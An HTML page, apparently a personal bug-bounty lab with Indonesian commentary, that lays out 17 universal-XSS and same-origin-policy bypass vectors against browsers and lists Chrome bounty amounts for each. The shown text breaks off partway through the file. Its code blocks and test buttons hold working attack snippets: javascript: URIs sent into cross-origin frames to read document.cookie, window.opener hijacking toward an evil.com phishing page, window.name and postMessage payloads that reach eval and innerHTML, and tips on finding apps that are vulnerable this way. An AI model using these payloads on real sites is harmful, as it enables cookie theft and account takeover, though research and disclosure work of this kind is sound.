@@ -1,0 +1,1692 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UXSS Research Lab — Browser VRP</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--border:#30363d;--text:#c9d1d9;--dim:#8b949e;--blue:#58a6ff;--blue2:#79c0ff;--red:#ff7b72;--orange:#ffa657;--yellow:#e3b341;--green:#56d364;--purple:#bc8cff}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:14px;line-height:1.6}
+h1{color:var(--blue2);font-size:18px;font-weight:800}
+h2{color:var(--blue);font-size:13px;font-weight:700;margin-bottom:6px}
+code{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:1px 6px;font-family:monospace;font-size:12px;color:var(--orange)}
+pre{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:12px;font-size:12px;overflow-x:auto;line-height:1.8;white-space:pre-wrap;color:var(--text)}
+.layout{display:flex;min-height:100vh}
+.sidebar{width:230px;min-height:100vh;background:var(--bg2);border-right:1px solid var(--border);padding:14px 0;position:fixed;top:0;left:0;overflow-y:auto}
+.main{margin-left:230px;padding:22px 28px;max-width:920px}
+.nav-brand{padding:0 12px 12px;border-bottom:1px solid var(--border);margin-bottom:8px}
+.nav-brand .t{color:var(--blue2);font-weight:800;font-size:13px}
+.nav-brand .s{color:var(--dim);font-size:10px;margin-top:2px}
+.nav-section{padding:9px 12px 2px;color:var(--dim);font-size:9px;text-transform:uppercase;letter-spacing:.8px}
+.nav-item{display:block;padding:5px 12px;color:var(--dim);font-size:12px;border-left:2px solid transparent;cursor:pointer;transition:all .12s}
+.nav-item:hover{color:var(--text);background:var(--bg3);border-left-color:var(--blue)}
+.nav-item.active{color:var(--blue);border-left-color:var(--blue);background:var(--bg3)}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:16px 20px;margin-bottom:14px}
+.card-hdr{display:flex;align-items:center;gap:9px;margin-bottom:11px;padding-bottom:9px;border-bottom:1px solid var(--border);flex-wrap:wrap}
+.badge{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:2px 8px;font-family:monospace;font-size:11px;font-weight:700;color:var(--blue)}
+.rb{font-size:10px;font-weight:700;padding:2px 7px;border-radius:4px;white-space:nowrap}
+.rb-r{background:#3d0000;color:var(--red)}.rb-g{background:#0d2d00;color:var(--green)}.rb-o{background:#2d1500;color:var(--orange)}.rb-p{background:#1a0a3d;color:var(--purple)}
+.btn{padding:6px 13px;border:1px solid var(--border);border-radius:6px;cursor:pointer;font-size:12px;font-weight:600;background:var(--bg3);color:var(--text);transition:all .12s;font-family:inherit}
+.btn:hover{border-color:var(--blue);color:var(--blue)}
+.btn-r{background:#3d0000;border-color:var(--red);color:var(--red)}.btn-r:hover{background:#5a0000}
+.btn-g{background:#0d2d00;border-color:var(--green);color:var(--green)}.btn-g:hover{background:#134000}
+.btn-o{background:#2d1500;border-color:var(--orange);color:var(--orange)}
+.btn-p{background:#1a0a3d;border-color:var(--purple);color:var(--purple)}
+.bgroup{display:flex;gap:7px;flex-wrap:wrap;margin-top:9px}
+.alert{border-radius:6px;padding:8px 12px;margin:7px 0;font-size:12px;line-height:1.6}
+.a-r{background:#3d0000;border:1px solid #b91c1c;color:var(--red)}
+.a-y{background:#2d2200;border:1px solid #9e6a03;color:var(--yellow)}
+.a-b{background:#0c2a4a;border:1px solid #1f6feb;color:var(--blue2)}
+.a-g{background:#0d2d00;border:1px solid #2ea043;color:var(--green)}
+.log{background:#010409;border:1px solid var(--border);border-radius:5px;padding:7px 10px;font-family:monospace;font-size:11px;min-height:36px;max-height:180px;overflow-y:auto;margin-top:7px}
+.ll-g{color:var(--green)}.ll-y{color:var(--yellow)}.ll-r{color:var(--red)}.ll-b{color:var(--blue)}.ll-d{color:var(--dim)}.ll-p{color:var(--purple)}
+.result{display:none;padding:9px 14px;border-radius:6px;font-family:monospace;font-size:13px;font-weight:700;margin-top:9px;border:2px solid}
+.bypass{background:#0d2d00;border-color:var(--green);color:var(--green)}
+.blocked{background:#3d0000;border-color:var(--red);color:var(--red)}
+.partial{background:#2d2200;border-color:var(--yellow);color:var(--yellow)}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{background:var(--bg3);padding:6px 10px;text-align:left;color:var(--dim);font-weight:600;font-size:10px;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--border)}
+td{padding:6px 10px;border-bottom:1px solid var(--border)}
+tr:last-child td{border-bottom:none}
+.chip{padding:3px 10px;border-radius:20px;font-size:10px;font-family:monospace;border:1px solid var(--border);color:var(--dim);background:var(--bg3);display:inline-block;margin:2px}
+.chip.ok{border-color:var(--green);color:var(--green)}.chip.err{border-color:var(--red);color:var(--red)}.chip.warn{border-color:var(--yellow);color:var(--yellow)}
+iframe.test-frame{border:1px solid var(--border);border-radius:4px;width:100%;height:80px;background:var(--bg3);margin-top:6px}
+</style>
+</head>
+<body>
+<div class="layout">
+<nav class="sidebar">
+  <div class="nav-brand"><div class="t">UXSS Lab</div><div class="s">Browser VRP · 2026</div></div>
+  <div class="nav-section">Overview</div>
+  <div class="nav-item active" onclick="show('overview')">📊 Dashboard</div>
+  <div class="nav-section">javascript: URI</div>
+  <div class="nav-item" onclick="show('js1')">U1 · iframe src</div>
+  <div class="nav-item" onclick="show('js2')">U2 · window.open</div>
+  <div class="nav-item" onclick="show('js3')">U3 · location after nav</div>
+  <div class="nav-item" onclick="show('js4')">U4 · a[href] click</div>
+  <div class="nav-section">about: / blob: / data:</div>
+  <div class="nav-item" onclick="show('ab1')">U5 · about:blank inherit</div>
+  <div class="nav-item" onclick="show('ab2')">U6 · blob: cross-origin</div>
+  <div class="nav-item" onclick="show('ab3')">U7 · srcdoc parent access</div>
+  <div class="nav-section">Opener / Navigation</div>
+  <div class="nav-item" onclick="show('op1')">U8 · opener chain</div>
+  <div class="nav-item" onclick="show('op2')">U9 · window.name persist</div>
+  <div class="nav-item" onclick="show('op3')">U10 · history race</div>
+  <div class="nav-section">document.domain</div>
+  <div class="nav-item" onclick="show('dd1')">U11 · domain relaxation</div>
+  <div class="nav-item" onclick="show('dd2')">U12 · document.domain=""</div>
+  <div class="nav-section">postMessage</div>
+  <div class="nav-item" onclick="show('pm1')">U13 · origin=* apps</div>
+  <div class="nav-item" onclick="show('pm2')">U14 · targetOrigin bypass</div>
+  <div class="nav-section">Service Worker</div>
+  <div class="nav-item" onclick="show('sw1')">U15 · SW navigation</div>
+  <div class="nav-section">Sandbox Escape</div>
+  <div class="nav-item" onclick="show('sb1')">U16 · allow-scripts</div>
+  <div class="nav-item" onclick="show('sb2')">U17 · allow-top-nav</div>
+  <div class="nav-section">Utilities</div>
+  <div class="nav-item" onclick="show('env')">🔍 Env Check</div>
+  <div class="nav-item" onclick="show('notes')">📋 Notes</div>
+</nav>
+
+<main class="main">
+
+<!-- ═══ OVERVIEW ═══ -->
+<div id="sec-overview">
+  <div style="margin-bottom:18px;padding-bottom:12px;border-bottom:1px solid var(--border)">
+    <h1>UXSS Research Lab</h1>
+    <p style="color:var(--dim);font-size:12px;margin-top:4px">Universal XSS = JavaScript execution in <em>any</em> origin's context. SOP bypass. Max Chrome VRP.</p>
+  </div>
+
+  <div class="alert a-b" style="margin-bottom:14px">
+    <strong>Apa itu UXSS?</strong> Berbeda dengan normal XSS (hanya di satu origin), UXSS
+    memungkinkan attacker mengeksekusi JS di konteks origin LAIN — misalnya menjalankan
+    <code>alert(document.cookie)</code> di <code>google.com</code> dari halaman attacker.
+    Ini = Same-Origin Policy bypass = Chrome VRP <strong>Critical / $15k–$30k+</strong>
+  </div>
+
+  <div class="card">
+    <div class="card-hdr"><span class="badge">17 VECTORS</span><h2>Attack Surface Map</h2></div>
+    <table>
+      <thead><tr><th>#</th><th>Vector</th><th>Root Cause</th><th>Chrome VRP $</th><th>Status</th></tr></thead>
+      <tbody id="overview-table">
+        <tr><td>U1</td><td>javascript: URI in iframe src</td><td>iframe navigation policy</td><td>$15k+</td><td><span class="chip" id="st-u1">—</span></td></tr>
+        <tr><td>U2</td><td>window.open("javascript:...")</td><td>popup origin inheritance</td><td>$10k+</td><td><span class="chip" id="st-u2">—</span></td></tr>
+        <tr><td>U3</td><td>location= after cross-origin nav</td><td>navigation origin tracking</td><td>$15k+</td><td><span class="chip" id="st-u3">—</span></td></tr>
+        <tr><td>U4</td><td>a[href=javascript:] synthetic click</td><td>click event + navigation</td><td>$5k+</td><td><span class="chip" id="st-u4">—</span></td></tr>
+        <tr><td>U5</td><td>about:blank origin inherit</td><td>about: policy edge case</td><td>$15k+</td><td><span class="chip" id="st-u5">—</span></td></tr>
+        <tr><td>U6</td><td>blob: cross-origin read</td><td>blob URL origin binding</td><td>$10k+</td><td><span class="chip" id="st-u6">—</span></td></tr>
+        <tr><td>U7</td><td>srcdoc + parent DOM access</td><td>about:srcdoc origin</td><td>$10k+</td><td><span class="chip" id="st-u7">—</span></td></tr>
+        <tr><td>U8</td><td>opener.opener chain</td><td>window reference leak</td><td>$10k+</td><td><span class="chip" id="st-u8">—</span></td></tr>
+        <tr><td>U9</td><td>window.name across origins</td><td>name persists after nav</td><td>$3k+</td><td><span class="chip" id="st-u9">—</span></td></tr>
+        <tr><td>U10</td><td>history.go race + navigate</td><td>session history races</td><td>$15k+</td><td><span class="chip" id="st-u10">—</span></td></tr>
+        <tr><td>U11</td><td>document.domain relaxation</td><td>legacy SOP exception</td><td>$10k+</td><td><span class="chip" id="st-u11">—</span></td></tr>
+        <tr><td>U12</td><td>document.domain="" trick</td><td>empty string behavior</td><td>$10k+</td><td><span class="chip" id="st-u12">—</span></td></tr>
+        <tr><td>U13</td><td>postMessage * in target apps</td><td>missing origin check</td><td>$1k–5k</td><td><span class="chip" id="st-u13">—</span></td></tr>
+        <tr><td>U14</td><td>postMessage targetOrigin bypass</td><td>regex/prefix check</td><td>$3k+</td><td><span class="chip" id="st-u14">—</span></td></tr>
+        <tr><td>U15</td><td>Service Worker nav interception</td><td>SW scope + origin</td><td>$15k+</td><td><span class="chip" id="st-u15">—</span></td></tr>
+        <tr><td>U16</td><td>sandbox allow-scripts escape</td><td>sandbox attribute gaps</td><td>$15k+</td><td><span class="chip" id="st-u16">—</span></td></tr>
+        <tr><td>U17</td><td>sandbox allow-top-navigation</td><td>top-nav SOP bypass</td><td>$10k+</td><td><span class="chip" id="st-u17">—</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <button class="btn btn-g" onclick="runAll()">▶ Run All Quick Tests</button>
+  <div class="log" id="overview-log"><span class="ll-b">→ Click Run All atau pilih vector dari sidebar.</span></div>
+</div>
+
+<!-- ═══ U1: javascript: iframe src ═══ -->
+<div id="sec-js1" style="display:none">
+<div class="card" style="border-color:var(--red)">
+  <div class="card-hdr"><span class="badge" style="color:var(--red)">U1</span><span class="rb rb-r">UXSS</span><h2>javascript: URI dalam iframe src</h2></div>
+  <div class="alert a-b">
+    Jika <code>&lt;iframe src="javascript:..."&gt;</code> dapat mengakses DOM parent,
+    attacker dari <code>evil.com</code> bisa menulis JS yang runs di konteks parent origin.
+    Chrome seharusnya memblokir ini — test untuk memastikan.
+  </div>
+  <pre>// Test: apakah iframe javascript: inherit parent origin?
+const f = document.createElement('iframe');
+f.src = "javascript:document.write('&lt;script&gt;parent.document.title=\"UXSS\"&lt;/scr'+'ipt&gt;')";
+document.body.appendChild(f);
+
+// Expected BLOCKED: iframe.contentDocument = null atau about:blank
+// UXSS FOUND: parent.document dapat dimodifikasi dari dalam iframe</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU1basic()">Test U1a: Basic inherit</button>
+    <button class="btn btn-r" onclick="testU1write()">Test U1b: document.write</button>
+    <button class="btn btn-r" onclick="testU1parent()">Test U1c: parent access</button>
+  </div>
+  <div class="log" id="u1-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u1-result"></div>
+</div>
+</div>
+
+<!-- ═══ U2: window.open javascript: ═══ -->
+<div id="sec-js2" style="display:none">
+<div class="card" style="border-color:var(--red)">
+  <div class="card-hdr"><span class="badge" style="color:var(--red)">U2</span><span class="rb rb-r">UXSS</span><h2>window.open("javascript:...")</h2></div>
+  <div class="alert a-b">
+    <code>window.open("javascript:alert(1)")</code> membuka popup dengan origin mewarisi dari
+    opener. Jika popup dapat mengakses <code>opener.document</code>, ini UXSS.
+    Chrome membatasi ini — tapi kombinasi dengan navigasi kadang bisa bypass.
+  </div>
+  <pre>// Variant A: langsung
+const w = window.open("javascript:alert(document.domain)");
+
+// Variant B: open blank dulu, lalu navigate
+const w = window.open("about:blank");
+w.location = "javascript:alert(opener.document.domain)";
+
+// Variant C: setelah navigasi ke real page
+const w = window.open("https://example.com");
+setTimeout(() => { w.location = "javascript:alert(document.cookie)"; }, 1000);</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU2a()">Test U2a: Direct js: open</button>
+    <button class="btn btn-r" onclick="testU2b()">Test U2b: blank → js:</button>
+    <button class="btn btn-r" onclick="testU2c()">Test U2c: after nav</button>
+  </div>
+  <div class="log" id="u2-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u2-result"></div>
+</div>
+</div>
+
+<!-- ═══ U3: location= after nav ═══ -->
+<div id="sec-js3" style="display:none">
+<div class="card" style="border-color:var(--red)">
+  <div class="card-hdr"><span class="badge" style="color:var(--red)">U3</span><span class="rb rb-r">UXSS</span><h2>location= "javascript:" setelah cross-origin navigasi</h2></div>
+  <div class="alert a-b">
+    Setelah frame menavigasi ke cross-origin URL, set <code>frame.location = "javascript:..."</code>
+    dari parent. Apakah JS berjalan di konteks origin baru (cross-origin) atau origin lama?
+    Ini salah satu vector UXSS yang historically sering muncul di Chromium bugs.
+  </div>
+  <pre>// Langkah:
+// 1. Parent di evil.com membuka iframe ke victim.com
+// 2. iframe.location = "https://victim.com"
+// 3. Setelah load, parent set: iframe.location = "javascript:alert(document.cookie)"
+// 4. Jika JS berjalan di victim.com context → UXSS
+
+const f = document.querySelector('iframe');
+f.src = "https://example.com";
+f.onload = () => {
+  f.contentWindow.location = "javascript:alert(document.domain)";
+  // Harusnya: SecurityError (cross-origin write blocked)
+  // UXSS: JS runs di example.com context
+};</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU3()">Test U3: Cross-origin location js:</button>
+    <button class="btn btn-r" onclick="testU3b()">Test U3b: Same-origin baseline</button>
+  </div>
+  <iframe id="u3-frame" class="test-frame" src="about:blank"></iframe>
+  <div class="log" id="u3-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u3-result"></div>
+</div>
+</div>
+
+<!-- ═══ U4: a[href] synthetic click ═══ -->
+<div id="sec-js4" style="display:none">
+<div class="card" style="border-color:var(--orange)">
+  <div class="card-hdr"><span class="badge" style="color:var(--orange)">U4</span><span class="rb rb-r">UXSS</span><h2>a[href="javascript:"] synthetic click</h2></div>
+  <div class="alert a-b">
+    Inject <code>&lt;a href="javascript:..."&gt;</code> ke dalam cross-origin frame, lalu
+    trigger <code>.click()</code> secara programmatic dari parent. Apakah browser mengizinkan?
+    Tanpa user gesture, seharusnya diblokir di modern Chrome.
+  </div>
+  <pre>// Inject link ke iframe cross-origin, trigger click
+const f = document.querySelector('iframe');
+const a = f.contentDocument.createElement('a');  // Ini sudah blocked oleh SOP
+a.href = "javascript:alert(document.cookie)";
+f.contentDocument.body.appendChild(a);
+a.click();
+
+// Test lain: target="_parent" untuk navigate parent
+const a2 = document.createElement('a');
+a2.href = "javascript:alert(parent.document.cookie)";
+a2.target = "_parent";
+a2.click();</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU4a()">Test U4a: js: link click</button>
+    <button class="btn btn-r" onclick="testU4b()">Test U4b: target=_parent</button>
+    <button class="btn btn-r" onclick="testU4c()">Test U4c: target=_top</button>
+  </div>
+  <div class="log" id="u4-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u4-result"></div>
+</div>
+</div>
+
+<!-- ═══ U5: about:blank inherit ═══ -->
+<div id="sec-ab1" style="display:none">
+<div class="card" style="border-color:var(--red)">
+  <div class="card-hdr"><span class="badge" style="color:var(--red)">U5</span><span class="rb rb-r">UXSS</span><h2>about:blank Origin Inheritance</h2></div>
+  <div class="alert a-b">
+    <code>about:blank</code> mewarisi origin dari halaman yang membukanya.
+    Edge case: jika cross-origin page membuka <code>about:blank</code> dan bisa
+    inject script, apakah script itu berjalan di context opener (parent) origin?
+  </div>
+  <pre>// about:blank dibuka oleh attacker.com → inherit attacker.com (NORMAL)
+const w = window.open("about:blank");
+w.document.write("&lt;script&gt;alert(document.domain)&lt;/script&gt;");
+// → alert("file://") atau "localhost" (origin attacker)
+
+// UXSS scenario: victim.com membuka about:blank
+// attacker mendapat reference ke popup via target="_blank" + opener
+// attacker menulis ke popup yang "owned" oleh victim.com
+
+// Test: apakah about:blank window dari cross-origin frame accessible?
+const f = document.createElement('iframe');
+f.src = "https://example.com";
+document.body.appendChild(f);
+f.onload = () => {
+  const sub = f.contentWindow.open("about:blank"); // cross-origin → exception
+  // Jika tidak exception → sub.document adalah about:blank dengan origin example.com
+};</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU5a()">Test U5a: about:blank self</button>
+    <button class="btn btn-r" onclick="testU5b()">Test U5b: inherit chain</button>
+    <button class="btn btn-r" onclick="testU5c()">Test U5c: cross-origin popup</button>
+  </div>
+  <div class="log" id="u5-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u5-result"></div>
+</div>
+</div>
+
+<!-- ═══ U6: blob: cross-origin ═══ -->
+<div id="sec-ab2" style="display:none">
+<div class="card" style="border-color:var(--orange)">
+  <div class="card-hdr"><span class="badge" style="color:var(--orange)">U6</span><span class="rb rb-r">UXSS</span><h2>blob: URL Cross-Origin Access</h2></div>
+  <div class="alert a-b">
+    <code>blob:</code> URL dibuat oleh suatu origin hanya bisa dibaca oleh origin yang sama.
+    Bug: jika attacker bisa trick cross-origin page untuk fetch blob URL attacker,
+    atau jika blob URL origin tracking ada celah → UXSS / data exfil.
+  </div>
+  <pre>// blob: URL mewarisi origin creator
+const blob = new Blob(["&lt;script&gt;alert(document.domain)&lt;/script&gt;"],
+  {type:"text/html"});
+const url = URL.createObjectURL(blob);
+// url = "blob:https://attacker.com/uuid"
+// → page di blob: berjalan di context "https://attacker.com"
+
+// Bug scenario: cross-origin iframe src = blob URL dari parent
+// Parent di A.com buat blob URL → set ke iframe
+// iframe sekarang berjalan di konteks A.com, bisa akses parent DOM
+
+const f = document.createElement('iframe');
+f.src = url;  // blob:// dari A.com → iframe run di A.com context!
+document.body.appendChild(f);
+// f.contentDocument.body → accessible dari parent (same origin)
+// UXSS jika f.contentDocument bisa exfil data dari parent</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU6a()">Test U6a: blob iframe access</button>
+    <button class="btn btn-r" onclick="testU6b()">Test U6b: blob origin check</button>
+    <button class="btn btn-r" onclick="testU6c()">Test U6c: blob → parent DOM</button>
+  </div>
+  <div class="log" id="u6-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u6-result"></div>
+</div>
+</div>
+
+<!-- ═══ U7: srcdoc ═══ -->
+<div id="sec-ab3" style="display:none">
+<div class="card" style="border-color:var(--orange)">
+  <div class="card-hdr"><span class="badge" style="color:var(--orange)">U7</span><span class="rb rb-r">UXSS</span><h2>iframe[srcdoc] Parent DOM Access</h2></div>
+  <div class="alert a-b">
+    <code>iframe[srcdoc]</code> membuat <code>about:srcdoc</code> document.
+    Origin-nya adalah parent's origin — artinya srcdoc iframe BISA mengakses parent DOM secara legitimate.
+    Bug: jika attacker bisa inject ke srcdoc dari cross-origin context.
+  </div>
+  <pre>// srcdoc iframe berjalan di SAME origin sebagai parent
+const f = document.createElement('iframe');
+f.srcdoc = "&lt;script&gt;alert(parent.document.domain)&lt;/script&gt;";
+document.body.appendChild(f);
+// → alert() menampilkan domain parent (EXPECTED)
+
+// UXSS scenario:
+// 1. Victim site menggunakan iframe[srcdoc] dengan konten user-controlled
+// 2. Attacker inject JS ke srcdoc content
+// 3. JS berjalan di origin victim.com → access victim's cookies
+
+// Test: apakah srcdoc bisa akses parent dengan sandbox?
+const f2 = document.createElement('iframe');
+f2.setAttribute('sandbox', 'allow-scripts');
+f2.srcdoc = "&lt;script&gt;try{parent.document.title='UXSS'}catch(e){document.write(e)}&lt;/script&gt;";
+document.body.appendChild(f2);</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU7a()">Test U7a: srcdoc parent access</button>
+    <button class="btn btn-r" onclick="testU7b()">Test U7b: srcdoc + sandbox</button>
+    <button class="btn btn-r" onclick="testU7c()">Test U7c: nested srcdoc</button>
+  </div>
+  <div class="log" id="u7-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u7-result"></div>
+</div>
+</div>
+
+<!-- ═══ U8: opener chain ═══ -->
+<div id="sec-op1" style="display:none">
+<div class="card" style="border-color:var(--purple)">
+  <div class="card-hdr"><span class="badge" style="color:var(--purple)">U8</span><span class="rb rb-o">HIGH</span><h2>window.opener Chain Exploitation</h2></div>
+  <div class="alert a-b">
+    <code>window.opener</code> memberikan reference ke halaman yang membuka popup.
+    Jika opener tidak di-nullified (<code>rel="noopener"</code>), popup bisa navigate
+    opener ke URL lain — termasuk <code>javascript:</code> URL.
+  </div>
+  <pre>// Victim.com membuka popup TANPA noopener:
+// &lt;a href="https://attacker.com" target="_blank"&gt;
+
+// Di attacker.com (popup):
+if (window.opener) {
+  // opener adalah victim.com window
+  window.opener.location = "javascript:alert(document.cookie)";
+  // Jika berhasil → UXSS di victim.com context
+
+  // Atau navigate ke phishing page:
+  window.opener.location = "https://evil.com/phish";
+}
+
+// Test chains:
+// opener.opener.location  (dua level)
+// opener.frames[0].location (target nested frame)</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU8a()">Test U8a: opener.location = js:</button>
+    <button class="btn btn-r" onclick="testU8b()">Test U8b: opener navigate</button>
+    <button class="btn btn-r" onclick="testU8c()">Test U8c: opener.opener</button>
+  </div>
+  <div class="log" id="u8-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u8-result"></div>
+</div>
+</div>
+
+<!-- ═══ U9: window.name ═══ -->
+<div id="sec-op2" style="display:none">
+<div class="card" style="border-color:var(--purple)">
+  <div class="card-hdr"><span class="badge" style="color:var(--purple)">U9</span><span class="rb rb-o">MEDIUM</span><h2>window.name Persistence Across Origins</h2></div>
+  <div class="alert a-b">
+    <code>window.name</code> persists ketika frame navigasi ke URL lain — bahkan cross-origin!
+    Ini bukan UXSS langsung, tapi bisa digunakan untuk data exfiltration atau
+    sebagai channel untuk payload delivery ke cross-origin page yang membaca <code>window.name</code>.
+  </div>
+  <pre>// Di attacker.com:
+window.name = "&lt;script&gt;alert(1)&lt;/script&gt;";  // payload
+location = "https://victim.com/page-that-reads-window.name";
+
+// Di victim.com (vulnerable code):
+document.write(window.name);  // XSS via window.name
+
+// Test: apakah window.name survive navigation?
+window.name = "PAYLOAD_TEST_12345";
+// Navigate ke halaman lain → kembali → cek window.name</pre>
+  <button class="btn btn-p" onclick="testU9()">Test U9: window.name persist</button>
+  <div class="log" id="u9-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u9-result"></div>
+  <div class="alert a-y" style="margin-top:10px">
+    <strong>Hunting tip:</strong> Cari target apps yang melakukan
+    <code>document.write(window.name)</code>, <code>innerHTML = window.name</code>,
+    atau <code>eval(window.name)</code>. Banyak legacy apps masih melakukan ini
+    untuk "messaging" antar halaman sebelum postMessage ada.
+  </div>
+</div>
+</div>
+
+<!-- ═══ U10: history race ═══ -->
+<div id="sec-op3" style="display:none">
+<div class="card" style="border-color:var(--red)">
+  <div class="card-hdr"><span class="badge" style="color:var(--red)">U10</span><span class="rb rb-r">UXSS</span><h2>History Navigation Race + javascript: URI</h2></div>
+  <div class="alert a-b">
+    Race condition: navigate iframe ke URL A, kemudian trigger <code>history.go(-1)</code>
+    sambil inject <code>javascript:</code> URL. Ada window di mana browser mungkin
+    menjalankan JS di origin A padahal frame sudah/belum load. Ini classic UXSS pattern.
+  </div>
+  <pre>// Classic pattern (James Lee / taviso style):
+const f = document.createElement('iframe');
+f.src = "https://example.com";
+document.body.appendChild(f);
+
+f.onload = function() {
+  // Frame loaded example.com
+  f.contentWindow.history.pushState({}, '', '/page2');
+  // Race: navigate back + inject js:
+  f.contentWindow.location = "javascript:void(0)";
+  f.contentWindow.history.go(-1);
+  // Di beberapa versi Chromium lama, JS runs di example.com context
+};
+
+// Variant: parent triggers history.back() pada frame
+// sementara inject javascript: URI ke frame</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU10a()">Test U10a: history race basic</button>
+    <button class="btn btn-r" onclick="testU10b()">Test U10b: pushState + js:</button>
+  </div>
+  <iframe id="u10-frame" class="test-frame" src="about:blank"></iframe>
+  <div class="log" id="u10-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u10-result"></div>
+</div>
+</div>
+
+<!-- ═══ U11: document.domain ═══ -->
+<div id="sec-dd1" style="display:none">
+<div class="card" style="border-color:var(--yellow)">
+  <div class="card-hdr"><span class="badge" style="color:var(--yellow)">U11</span><span class="rb rb-o">HIGH</span><h2>document.domain Relaxation</h2></div>
+  <div class="alert a-b">
+    Jika dua halaman di subdomain yang sama set <code>document.domain = "parent.com"</code>,
+    mereka bisa saling akses DOM (legacy SOP exception). Chrome mulai deprecated ini
+    di Chrome 106+. Test apakah masih berfungsi.
+  </div>
+  <pre>// sub1.example.com:
+document.domain = "example.com";
+
+// sub2.example.com:
+document.domain = "example.com";
+
+// Sekarang sub1 dan sub2 bisa saling akses DOM!
+// → sub1.document dari sub2 → read cookies, DOM manipulation
+
+// Bug: jika document.domain bisa diset ke sesuatu yang lebih tinggi dari registrable domain
+// atau jika ada bypass untuk Chrome's deprecation</pre>
+  <button class="btn btn-o" onclick="testU11()">Test U11: document.domain</button>
+  <div class="log" id="u11-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u11-result"></div>
+</div>
+</div>
+
+<!-- ═══ U12: document.domain="" ═══ -->
+<div id="sec-dd2" style="display:none">
+<div class="card" style="border-color:var(--yellow)">
+  <div class="card-hdr"><span class="badge" style="color:var(--yellow)">U12</span><span class="rb rb-o">HIGH</span><h2>document.domain = "" (Empty String)</h2></div>
+  <div class="alert a-b">
+    Setting <code>document.domain = ""</code> (empty string) historically
+    berperilaku berbeda di browser berbeda. Di beberapa versi, ini bisa
+    membuat two pages dengan empty domain bisa saling akses — bahkan lintas origin.
+  </div>
+  <pre>// Test: behavior of document.domain = ""
+console.log("before:", document.domain);
+try {
+  document.domain = "";
+  console.log("after:", document.domain);  // Apa hasilnya?
+} catch(e) {
+  console.log("error:", e.message);
+}
+
+// Di Chrome versi lama: document.domain = "" → domain = ""
+// Dua halaman berbeda dengan domain = "" → bisa saling akses?
+
+// Tambahan test: document.domain = location.hostname
+// document.domain = document.domain (reset ke current)
+// document.domain = "com" (TLD — seharusnya gagal)</pre>
+  <button class="btn btn-o" onclick="testU12()">Test U12: All domain variants</button>
+  <div class="log" id="u12-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u12-result"></div>
+</div>
+</div>
+
+<!-- ═══ U13: postMessage * apps ═══ -->
+<div id="sec-pm1" style="display:none">
+<div class="card" style="border-color:var(--orange)">
+  <div class="card-hdr"><span class="badge" style="color:var(--orange)">U13</span><span class="rb rb-o">$1k–5k</span><h2>postMessage origin=* — App-Level XSS</h2></div>
+  <div class="alert a-b">
+    Apps yang listen <code>message</code> event tanpa cek <code>event.origin</code>
+    bisa di-exploit dari halaman manapun. Ini app-level bug (bukan browser bug)
+    tapi tetap dibayar sebagai XSS/ATO jika ada impact nyata.
+  </div>
+  <pre>// Vulnerable app code:
+window.addEventListener('message', function(e) {
+  // BUG: tidak cek e.origin!
+  eval(e.data);  // atau innerHTML = e.data, dll
+});
+
+// Attacker dari evil.com:
+const victim = window.open("https://victim.com");
+victim.postMessage("alert(document.cookie)", "*");
+
+// Deteksi: cari pattern ini di JS target
+// addEventListener('message', ...)  tanpa  if(e.origin !== "https://target.com") return</pre>
+
+  <h3 style="margin-bottom:8px;margin-top:12px;color:var(--dim)">Local demo — postMessage vuln pattern:</h3>
+  <div class="grid2">
+    <div>
+      <div style="font-size:11px;color:var(--dim);margin-bottom:4px">Vulnerable receiver (iframe):</div>
+      <iframe id="pm1-victim" class="test-frame" srcdoc="<script>
+window.addEventListener('message',function(e){
+  document.body.innerHTML='<div style=padding:8px;color:#ff7b72>Received (no origin check): '+e.data+'<br>sender: '+e.origin+'</div>';
+});
+document.body.innerHTML='<div style=padding:8px;color:#8b949e>Waiting for postMessage...</div>';
+</script>" style="height:60px"></iframe>
+    </div>
+    <div>
+      <div style="font-size:11px;color:var(--dim);margin-bottom:4px">Send attack payload:</div>
+      <input id="pm1-payload" value="&lt;img src=x onerror=alert(document.domain)&gt;" style="width:100%;padding:5px 8px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:11px;font-family:monospace;margin-bottom:5px">
+      <button class="btn btn-r" onclick="testU13()">Send postMessage attack</button>
+    </div>
+  </div>
+  <div class="log" id="u13-log"><span class="ll-b">→ Run test.</span></div>
+</div>
+</div>
+
+<!-- ═══ U14: postMessage bypass ═══ -->
+<div id="sec-pm2" style="display:none">
